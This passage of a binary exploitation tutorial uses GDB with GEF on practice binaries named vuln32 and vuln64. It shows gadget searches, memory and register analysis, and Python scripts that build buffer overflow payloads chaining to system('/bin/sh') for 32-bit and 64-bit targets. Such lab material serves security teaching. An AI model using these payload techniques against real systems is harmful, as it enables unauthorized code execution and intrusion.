<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># More complex ROP chain example with system(&quot;/bin/sh&quot;)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pop rdi&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401273: pop rdi</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> ret</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Search for &quot;/bin/sh&quot; string or create one</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ search-pattern </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Searching </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;/bin/sh&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> memory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> In </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">0x7ffff7c00000-0x7ffff7df2000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">, </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">permission</span><span class="token operator">=</span><span class="token plain">r-x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  0x7ffff7d74678 - 0x7ffff7d7467f  ‚Üí   </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token plain"> </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Advanced ROP chain: pop rdi; ret; &quot;/bin/sh&quot;; system</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Payload structure:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># 72 bytes padding</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># + pop rdi; ret gadget (0x401273)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># + &quot;/bin/sh&quot; address (0x7ffff7d74678)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># + system address</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ print system</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$3</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token operator">&lt;</span><span class="token plain">text variable, no debug info</span><span class="token operator">&gt;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"> 0x401060 </span><span class="token operator">&lt;</span><span class="token plain">system@plt</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Create advanced ROP payload</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">import struct</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload = b&#x27;A&#x27; * 72</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;Q&#x27;, 0x401273)      # pop rdi; ret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;Q&#x27;, 0x7ffff7d74678) # &#x27;/bin/sh&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;Q&#x27;, 0x401060)      # system@plt</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">print(payload)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><span class="token plain"> </span><span class="token operator">&gt;</span><span class="token plain"> rop_payload</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Test the advanced ROP chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token operator">&lt;</span><span class="token plain"> rop_payload</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="comprehensive-analysis-commands">Comprehensive Analysis Commands<a href="#comprehensive-analysis-commands" class="hash-link" aria-label="Direct link to Comprehensive Analysis Commands" title="Direct link to Comprehensive Analysis Commands" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Memory layout analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ vmmap</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain"> Legend:  Code </span><span class="token operator">|</span><span class="token plain"> Heap </span><span class="token operator">|</span><span class="token plain"> Stack </span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Start              End                Offset             Perm Path</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /home/user/vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /home/user/vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /home/user/vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /home/user/vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /home/user/vuln64</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Stack frame analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ info frame</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">Stack level </span><span class="token number">0</span><span class="token plain">, frame at 0x7fffffffde10:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> rip </span><span class="token operator">=</span><span class="token plain"> 0x401202 </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> vulnerable_function </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">vuln64.c:17</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> saved rip </span><span class="token operator">=</span><span class="token plain"> 0x40125c</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> called by frame at 0x7fffffffde30</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">source</span><span class="token plain"> language c.</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Arglist at 0x7fffffffde00, args: </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Locals at 0x7fffffffde00, Previous frame&#x27;s sp is 0x7fffffffde10</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"> Saved registers:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  rbp at 0x7fffffffde00, rip at 0x7fffffffde08</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Register analysis during exploitation</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ registers</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rax</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0x00007fffffffddb0  ‚Üí  </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rbx</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0x0               </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rcx</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0x00007ffff7f13a37  ‚Üí  0x5b77fffff0003d48 </span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token string" style="color:rgb(255, 121, 198)">&quot;H=&quot;</span><span class="token plain">?</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rdx</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0xc8              </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsp</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0x00007fffffffddb0  ‚Üí  </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rbp</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0x00007fffffffde00  ‚Üí  </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;AAAAAAAA‚§¥&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rsi</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0x00007fffffffddb0  ‚Üí  </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rdi</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0x0               </span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$rip</span><span class="token plain">   </span><span class="token builtin class-name" style="color:rgb(189, 147, 249)">:</span><span class="token plain"> 0x0000000000401202  ‚Üí  </span><span class="token operator">&lt;</span><span class="token plain">vulnerable_function+4</span><span class="token operator file-descriptor important">9</span><span class="token operator">&gt;</span><span class="token plain"> call 0x401050 </span><span class="token operator">&lt;</span><span class="token plain">read@plt</span><span class="token operator">&gt;</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="key-differences-between-32-bit-and-64-bit-exploitation">Key Differences Between 32-bit and 64-bit Exploitation<a href="#key-differences-between-32-bit-and-64-bit-exploitation" class="hash-link" aria-label="Direct link to Key Differences Between 32-bit and 64-bit Exploitation" title="Direct link to Key Differences Between 32-bit and 64-bit Exploitation" translate="no">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="32-bit-characteristics">32-bit Characteristics:<a href="#32-bit-characteristics" class="hash-link" aria-label="Direct link to 32-bit Characteristics:" title="Direct link to 32-bit Characteristics:" translate="no">‚Äã</a></h3>
<ul>
<li><strong>Calling Convention</strong>: Arguments passed on stack</li>
<li><strong>Address Size</strong>: 4 bytes (0x08049169)</li>
<li><strong>Registers</strong>: EAX, EBX, ECX, EDX, ESP, EBP, EIP</li>
<li><strong>Stack Growth</strong>: Downward (high to low addresses)</li>
<li><strong>Exploitation</strong>: Direct function calls, simpler ROP chains</li>
<li><strong>Memory Layout</strong>: More predictable, less ASLR entropy</li>
</ul>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="64-bit-characteristics">64-bit Characteristics:<a href="#64-bit-characteristics" class="hash-link" aria-label="Direct link to 64-bit Characteristics:" title="Direct link to 64-bit Characteristics:" translate="no">‚Äã</a></h3>
<ul>
<li><strong>Calling Convention</strong>: System V ABI - RDI, RSI, RDX, RCX, R8, R9, then stack</li>
<li><strong>Address Size</strong>: 8 bytes (0x00000000004011a5)</li>
<li><strong>Registers</strong>: RAX, RBX, RCX, RDX, RSP, RBP, RIP + R8-R15</li>
<li><strong>Stack Growth</strong>: Downward (high to low addresses)</li>
<li><strong>Exploitation</strong>: Requires ROP chains for function arguments</li>
<li><strong>Memory Layout</strong>: More complex, higher ASLR entropy</li>
</ul>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="advanced-exploitation-techniques">Advanced Exploitation Techniques<a href="#advanced-exploitation-techniques" class="hash-link" aria-label="Direct link to Advanced Exploitation Techniques" title="Direct link to Advanced Exploitation Techniques" translate="no">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="32-bit-function-call-exploitation">32-bit Function Call Exploitation<a href="#32-bit-function-call-exploitation" class="hash-link" aria-label="Direct link to 32-bit Function Call Exploitation" title="Direct link to 32-bit Function Call Exploitation" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># 32-bit direct function call with arguments</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Example: system(&quot;/bin/sh&quot;) call</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Find system and &quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ print system</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$1</span><span class="token plain"> </span><span class="token operator">=</span><span class="token plain"> </span><span class="token punctuation" style="color:rgb(248, 248, 242)">{</span><span class="token operator">&lt;</span><span class="token plain">text variable, no debug info</span><span class="token operator">&gt;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">}</span><span class="token plain"> 0xf7e16200 </span><span class="token operator">&lt;</span><span class="token plain">system</span><span class="token operator">&gt;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ search-pattern </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> Searching </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;/bin/sh&#x27;</span><span class="token plain"> </span><span class="token keyword" style="color:rgb(189, 147, 249);font-style:italic">in</span><span class="token plain"> memory</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token punctuation" style="color:rgb(248, 248, 242)">[</span><span class="token plain">+</span><span class="token punctuation" style="color:rgb(248, 248, 242)">]</span><span class="token plain"> In </span><span class="token string" style="color:rgb(255, 121, 198)">&#x27;/lib/i386-linux-gnu/libc.so.6&#x27;</span><span class="token punctuation" style="color:rgb(248, 248, 242)">(</span><span class="token plain">0xf7df0000-0xf7f71000</span><span class="token punctuation" style="color:rgb(248, 248, 242)">)</span><span class="token plain">, </span><span class="token assign-left variable" style="color:rgb(189, 147, 249);font-style:italic">permission</span><span class="token operator">=</span><span class="token plain">r-x</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">  0xf7f5a0cf - 0xf7f5a0d6  ‚Üí   </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;/bin/sh&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># 32-bit payload structure:</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># 76 bytes padding + system_addr + return_addr + &quot;/bin/sh&quot;_addr</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">import struct</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload = b&#x27;A&#x27; * 76</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;I&#x27;, 0xf7e16200)  # system()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;I&#x27;, 0x41414141)  # fake return address</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;I&#x27;, 0xf7f5a0cf)  # &#x27;/bin/sh&#x27;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">with open(&#x27;payload32.bin&#x27;, &#x27;wb&#x27;) as f:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">    f.write(payload)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Test 32-bit system call</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">$(</span><span class="token variable function" style="color:rgb(80, 250, 123);font-style:italic">cat</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic"> payload32.bin</span><span class="token variable" style="color:rgb(189, 147, 249);font-style:italic">)</span><br></span></code></pre></div></div>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="64-bit-rop-chain-with-arguments">64-bit ROP Chain with Arguments<a href="#64-bit-rop-chain-with-arguments" class="hash-link" aria-label="Direct link to 64-bit ROP Chain with Arguments" title="Direct link to 64-bit ROP Chain with Arguments" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># 64-bit system(&quot;/bin/sh&quot;) with proper ROP chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Need: pop rdi; ret; + &quot;/bin/sh&quot; + system</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Advanced ROP gadget search</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pop rdi; ret&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401273: pop rdi</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> ret</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ ropper </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">--search</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;pop rsi; ret&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">0x0000000000401271: pop rsi</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> pop r15</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"> ret</span><span class="token punctuation" style="color:rgb(248, 248, 242)">;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># 64-bit payload structure with ROP</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">python3 </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-c</span><span class="token plain"> </span><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">import struct</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)"># Addresses (replace with actual values from your analysis)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">pop_rdi_ret = 0x401273</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">binsh_addr = 0x7ffff7d74678</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">system_addr = 0x401060</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload = b&#x27;A&#x27; * 72                    # Buffer overflow padding</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;Q&#x27;, pop_rdi_ret)  # pop rdi; ret</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;Q&#x27;, binsh_addr)   # &#x27;/bin/sh&#x27; -&gt; RDI</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">payload += struct.pack(&#x27;&lt;Q&#x27;, system_addr)  # system()</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">with open(&#x27;payload64.bin&#x27;, &#x27;wb&#x27;) as f:</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">    f.write(payload)</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token string" style="color:rgb(255, 121, 198)">&quot;</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Test 64-bit ROP chain</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ run </span><span class="token operator">&lt;</span><span class="token plain"> payload64.bin</span><br></span></code></pre></div></div>
<h2 class="anchor anchorWithStickyNavbar_LWe7" id="comprehensive-gef-analysis-workflow">Comprehensive GEF Analysis Workflow<a href="#comprehensive-gef-analysis-workflow" class="hash-link" aria-label="Direct link to Comprehensive GEF Analysis Workflow" title="Direct link to Comprehensive GEF Analysis Workflow" translate="no">‚Äã</a></h2>
<h3 class="anchor anchorWithStickyNavbar_LWe7" id="complete-32-bit-analysis-session">Complete 32-bit Analysis Session<a href="#complete-32-bit-analysis-session" class="hash-link" aria-label="Direct link to Complete 32-bit Analysis Session" title="Direct link to Complete 32-bit Analysis Session" translate="no">‚Äã</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-color:#F8F8F2;--prism-background-color:#282A36"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="color:#F8F8F2;background-color:#282A36"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:#F8F8F2"><span class="token comment" style="color:rgb(98, 114, 164)"># Start comprehensive analysis</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gdb </span><span class="token parameter variable" style="color:rgb(189, 147, 249);font-style:italic">-q</span><span class="token plain"> vuln32</span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain"></span><span class="token comment" style="color:rgb(98, 114, 164)"># Step 1: Initial reconnaissance</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ </span><span class="token function" style="color:rgb(80, 250, 123)">file</span><span class="token plain"></span><br></span><span class="token-line" style="color:#F8F8F2"><span class="token plain">gef‚û§ checksec</span><br></span><span class="token-line" 